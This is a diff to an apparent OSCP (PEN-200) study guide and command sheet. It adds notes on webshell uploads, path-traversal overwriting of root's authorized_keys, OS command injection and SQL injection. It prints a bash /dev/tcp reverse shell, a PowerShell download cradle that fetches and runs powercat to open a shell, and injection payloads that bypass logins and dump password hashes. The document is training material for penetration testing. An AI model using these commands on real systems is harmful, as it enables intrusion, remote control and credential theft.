@@ -1,6 +1,20 @@
 # OSCP-Study-Guide
 Study guide and command sheet for Offensive Security PEN-200 course (Offensive Security Certified Professional - OSCP)
 
+## One-Liners
+
+### Reverse Shells
+A lot of useful examples for one-liners may be found here: [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/)
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+### Python
+Mini server:
+```bash
+python3 -m http.server 8080
+```
+
 ## Passive Information Gathering
 Passive information gathering in pentesting involves collecting data about a target system or network without direct interaction, typically using tools and techniques to analyze publicly available information and detect vulnerabilities.
 
@@ -248,19 +262,189 @@ The `data://` wrapper allows embedding data elements as plain text or base64-enc
 - The `data://` wrapper requires the `allow_url_include` setting to be enabled in the PHP configuration, which is not the default setting.
 - Always ensure legal and ethical considerations are adhered to when testing and exploiting vulnerabilities.
 
+## Exploiting File Upload Vulnerabilities for Code Execution
+File upload vulnerabilities offer an avenue for attackers to upload and execute malicious files on a web server. Understanding how to identify and exploit these vulnerabilities is crucial for penetration testers.
 
-## One-Liners
+### Exploiting the example Web Application
+In the example web application, the Admin link was replaced with an upload form, allowing users to upload pictures for a contest. The application runs on the XAMPP stack on a Windows system.
+1. **Identify Upload Mechanism**: Determine if text files can be uploaded by testing the upload functionality. Successful upload indicates the mechanism is not strictly limited to images.
+2. **Bypassing Upload Filters**: Attempt to upload a PHP webshell (`simple-backdoor.php`). If blocked, try bypassing the filter by changing the file extension to less common ones like `.phps` or `.php7`, or by changing characters in the extension to uppercase.
+3. **Executing Code**: After bypassing the filter and uploading the file, confirm if code can be executed by accessing the uploaded file in the `uploads` directory.
+4. **Obtaining a Reverse Shell**:
+   - Start a Netcat listener on port 80.
+   - Use a PowerShell one-liner for the reverse shell, encoding it in base64 to bypass special character restrictions.
+   - Use curl to execute the encoded one-liner via the uploaded backdoor.
+   - Receive the reverse shell in the Netcat listener terminal.
 
-### Reverse Shells
-A lot of useful examples for one-liners may be found here: [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/)
+#### Example Commands:
+
+Upload the text file to test upload functionality
 ```bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+curl -F "file=@test.txt" http://target_url/upload_form
 ```
-### Python
-Mini server:
+Upload the PHP webshell with a modified extension
 ```bash
-python3 -m http.server 8080
+curl -F "file=@simple-backdoor.php7" http://target_url/upload_form
 ```
+Execute the base64 encoded PowerShell reverse shell
+```bash
+curl http://target_url/uploads/simple-backdoor.php7?cmd=powershell%20-enc%20[base64_encoded_reverse_shell]
+```
+
+## Exploiting Non-Executable File Uploads for System Access
+This section discusses the potential severity of unrestricted file upload mechanisms, even when direct execution of uploaded files isn't possible. It emphasizes leveraging other vulnerabilities like Directory Traversal to manipulate file uploads effectively.
+
+#### Steps for Exploitation:
+1. **Confirm File Existence**: Use `curl` to check for the existence of specific files (e.g., `admin.php`, `index.php`).
+2. **Test File Uploads**: Utilize Burp Suite to capture requests and test the upload functionality, confirming the success of text file uploads.
+3. **Attempt Directory Traversal**: Modify the `filename` parameter to include a relative path and test if the application writes the file outside the web root.
+4. **Overwrite Critical Files**:
+   - Assess web server permissions and consider the possibility of web applications running with elevated privileges.
+   - Attempt to blindly overwrite sensitive files like `authorized_keys` to gain system access.
+
+#### Exploiting SSH Access:
+1. **Prepare SSH Key Pair**: Create an SSH key pair and prepare an `authorized_keys` file containing the public key.
+2. **Upload `authorized_keys` File**: Use the file upload form to submit the `authorized_keys` file with a modified filename to overwrite the root user's `authorized_keys`.
+3. **Establish SSH Connection**:
+   - Delete the `known_hosts` file to avoid host key verification errors.
+   - Use the private key of the uploaded public key to attempt an SSH connection to the target system.
+
+#### Example Commands:
+
+Confirming file existence
+```bash
+curl http://target_url/admin.php
+```
+Uploading the authorized_keys file
+```bash
+curl -F "file=@authorized_keys;filename=../../../../../../../root/.ssh/authorized_keys" http://target_url/upload_form
+```
+Establishing SSH connection
+```bash
+ssh -i private_key_file -p 2222 root@target_system
+```
+
+## OS Command Injection in Web Applications
+OS Command Injection vulnerabilities arise when web applications accept user input for operating system commands without proper sanitization, potentially allowing attackers to execute arbitrary commands.
+
+### Steps for Exploitation:
+1. **Test Command Execution**: Use the form to clone a repository and observe if the actual command is displayed in the application's output.
+2. **Attempt Command Injection with curl**:
+   - Analyze the POST request structure in Burp Suite's HTTP history.
+   - Use curl to inject commands, observing the application's response to various inputs.
+   - Experiment with bypassing filters by URL-encoding semicolons (`%3B`) and other characters to delimit commands.
+
+### Leveraging PowerShell for System Access:
+1. **Determine Execution Environment**: Inject commands to check if they are executed in CMD or PowerShell.
+2. **Setup for Reverse Shell**:
+   - Start a Python web server serving `powercat.ps1` (a PowerShell implementation of Netcat).
+   - Create a Netcat listener on a designated port to catch the reverse shell.
+3. **Inject Reverse Shell Command**:
+   - Use a PowerShell download cradle to load `powercat.ps1` from the Python web server.
+   - Execute `powercat` to create a reverse shell, specifying the connection address and port.
+
+#### Example Commands:
+Injecting commands using curl
+```bash
+curl -X POST --data "Archive=git%3Bipconfig" http://target_url/clone
+```
+Injecting the PowerShell download cradle and Powercat reverse shell
+```bash
+curl -X POST --data "Archive=git%3Bpowershell -c \"[Command for Download Cradle];powercat -c [Target IP] -p [Port] -e cmd\"" http://target_url/clone
+```
+Download and execute the powercat.ps1 script from a specified URL, then use the powercat function to open a reverse shell connection to the specified IP address and port. Once the connection is established, it provides a PowerShell interface for executing commands on the remote system.
+```bash
+IEX (new-object net.webclient).downloadstring("http://192.168.118.6/powercat.ps1"); powercat -c 192.168.118.6 -p 4444 -e powershell
+```
+
+## DB Types and Characteristics: MySQL and MSSQL
+When testing web applications, it's essential to be versatile in interacting with different SQL database variants due to their varying syntax, function, and features. This section focuses on MySQL and Microsoft SQL Server (MSSQL), two of the most common database variants.
+
+## MySQL Basics
+1. **Connecting to MySQL**: Use the `mysql` command to connect to a remote MySQL instance by specifying the username, password, and port (default 3306).
+2. **Retrieving MySQL Version**: Use the `version` function from the MySQL console shell to get the running SQL instance's version.
+3. **Verifying Current Database User**: Use the `system_user` function to return the current username and hostname for the MySQL connection.
+4. **Listing All Databases**: Issue `SHOW DATABASES` to collect a list of all databases in the MySQL session.
+5. **Retrieving User Password**: 
+   - Navigate to the `mysql` database.
+   - Use a `SELECT` statement with `WHERE` clause to filter the `user` and `authentication_string` values from the `user` table.
+   - Note: Passwords are stored as a hash using Caching-SHA-256 algorithm.
+
+## MSSQL Basics
+1. **Connecting to MSSQL**: Use `impacket-mssqlclient` from Kali Linux to connect to a remote Windows machine running MSSQL. Specify username, password, remote IP, and `-windows-auth` for NTLM authentication.
+```bash
+impacket-mssqlclient Administrator:Password123@192.168.0.110 -windows-auth;
+```
+2. **Retrieving MSSQL Version**: Select `@@version` to inspect the current version of the underlying operating system and MSSQL server.
+3. **Listing All Databases**: Select all names from the system catalog to list available databases. Focus on custom databases like `offsec` for potential target data.
+4. **Reviewing Specific Database**: Query the `tables` table in the corresponding `information_schema` to review tables in the custom database.
+5. **Inspecting Tables and Data**: Select records from specific tables to review data such as usernames and passwords. Note that the `users` table might contain clear-text passwords.
+
+## Identifying SQLi via Error-based Payloads
+Error-based SQL injection (SQLi) exploits can reveal underlying database information by manipulating user-supplied input in web applications. This method typically involves injecting SQL code that causes the database to produce error messages, which can then be used to gather information about the database structure and contents.
+
+### Exploiting Authentication Bypass
+1. **Crafting SQL Query**: Control the `$sql_query` variable by manipulating user input, like `uname` and `password`, to create a different SQL query.
+2. **Forcing SQL Statement Closure**: Append an OR statement with a comment separator (`//`) to prematurely terminate the SQL statement, leading to authentication bypass by returning the first user ID present in the database.
+
+#### Example Authentication Payload:
+```sql
+' OR 1=1 //
+```
+
+### Enumerating Database Directly
+1. **Identifying SQL Interaction**: Insert special characters like a single quote (`'`) in the input field to test for interaction with the underlying SQL server.
+2. **Injecting Error-based Payload**: Terminate the implied SQL query and inject a second statement to retrieve database information like the MySQL version.
+3. **Retrieving Specific Data**: Query individual columns one at a time due to the limitation of querying only one column at a time.
+
+#### Example Enumeration Payloads:
+```sql
+' UNION SELECT @@version //
+```
+```sql
+' UNION SELECT password FROM users WHERE username = 'admin' //
+```
+
+#### Results and Conclusions
+- **Successful Authentication Bypass**: Received an Authentication Successful message, indicating the attack succeeded.
+- **Database Version Retrieval**: Retrieved the running MySQL version by injecting an arbitrary second statement.
+- **User Password Hash Retrieval**: Retrieved MD5 password hashes for users by querying the `password` column from the `users` table and specifying users individually with a `WHERE` clause.
+
+## Exploiting UNION-based SQL Injections
+UNION-based SQL injections involve using the UNION SQL operator to combine the results of two SELECT statements into a single result set. This technique is useful when the result of the query is displayed along with application-returned values.
+
+## Steps for Exploitation:
+1. **Understanding UNION Requirements**: The injected UNION query must have the same number of columns as the original query, and the data types must match for each corresponding column.
+2. **Discovering Column Count**: Submit queries ordering by increasing column numbers to determine the exact number of columns in the target table.
+3. **Executing UNION-based Attacks**:
+   - Use the UNION SELECT statement to concatenate your query with the original.
+   - Ensure data type compatibility by matching the data types of your injected values with those of the original columns.
+   - Shift enumerating functions to the right-most place to avoid type mismatches.
+
+### Example Enumeration Payloads:
+```sql
+' ORDER BY 6 --   # Discover number of columns
+' UNION SELECT NULL, current_user(), version(), NULL, NULL --  # Enumerate DB name, user, MySQL version
+' UNION SELECT NULL, NULL, table_name, column_name, NULL FROM information_schema.columns WHERE table_schema = database() --  # Enumerate tables and columns
+' UNION SELECT NULL, username, password, description, NULL FROM users --  # Dump user data
+```
+
+## Results and Conclusions:
+- **Successful Data Retrieval**: Successfully retrieved the username, DB version, and discovered a new table named `users` with columns including `password`.
+- **Extraction of User Data**: Successfully extracted usernames and MD5 password hashes from the `users` table, including administrative accounts.
+- **MD5 Hashes**: Retrieved MD5 password hashes can potentially be decrypted using appropriate tools or services.
+
+## Conclusion
+UNION-based SQL injection is a powerful technique for extracting sensitive information from a database. By carefully crafting SQL queries and understanding the database structure, attackers can exploit these vulnerabilities to retrieve a wide range of data.
+
+## Caution
+The techniques and examples provided are for educational purposes only. Unauthorized testing and exploitation of vulnerabilities without consent is illegal and unethical.
+```
+
+- missing blind SQL injection
+
+
+
 
 ## Disclaimer and Legal Notice
 
